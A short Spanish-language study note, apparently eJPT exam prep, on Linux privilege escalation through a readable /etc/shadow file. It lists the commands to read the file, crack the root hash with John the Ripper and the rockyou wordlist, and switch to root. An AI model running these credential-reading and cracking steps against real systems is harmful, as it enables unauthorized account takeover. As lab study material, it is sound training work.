Archivo Legible: /etc/shadow

- El archivo /etc/shadow contiene hashes de contraseñas de usuario y normalmente sólo puede leerlo el usuario root.

```
   ls -l /etc/shadow
```

- Vea el contenido del archivo /etc/shadow:

```
	cat /etc/shadow
```

Cada línea del archivo representa un usuario. El hash de contraseña de un usuario (si tiene uno) se puede encontrar entre el primer y segundo dos puntos (:) de cada línea.

- Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- Switch to the root user, using the cracked password:

```
su root
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/Permisos de archivos débiles- Escribible]]